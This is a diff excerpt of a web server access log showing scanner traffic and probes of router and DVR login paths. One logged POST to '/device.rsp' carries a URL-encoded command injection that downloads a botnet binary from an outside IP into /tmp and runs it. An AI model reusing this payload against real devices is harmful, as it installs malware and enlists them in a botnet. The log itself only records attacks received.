@@ -3518,3 +3518,7 @@
 [22/Sep/2025:11:00:27 +0000] 200 - GET http 186.237.225.6 "/" [Client 172.18.0.1] [Length 1033] [Gzip -] "Hello World/1.0" "-"
 [22/Sep/2025:11:06:30 +0000] 404 - POST http 186.237.225.6 "/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7.urbotnetisass%3B%20wget%20http%3A%2F%2F94.154.35.154%2Farm7.urbotnetisass%3B%20chmod%20777%20%2A%3B%20.%2Farm7.urbotnetisass%20tbk" [Client 172.18.0.1] [Length 122] [Gzip 1.35] "Mozila/5.0" "-"
 [22/Sep/2025:11:46:33 +0000] 200 - GET http 186.237.225.6 "/" [Client 172.18.0.1] [Length 568] [Gzip 1.86] "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
+[22/Sep/2025:12:21:46 +0000] 200 - GET http 186.237.225.6 "/" [Client 172.18.0.1] [Length 1033] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246" "-"
+[22/Sep/2025:12:45:41 +0000] 404 - GET http 186.237.225.6 "/login.rsp" [Client 172.18.0.1] [Length 150] [Gzip -] "Hello World" "-"
+[22/Sep/2025:13:00:23 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 172.18.0.1] [Length 154] [Gzip -] "-" "-"
+[22/Sep/2025:13:00:23 +0000] 400 - POST http 186.237.225.6 "/boaform/webLogin" [Client 172.18.0.1] [Length 154] [Gzip -] "-" "-"
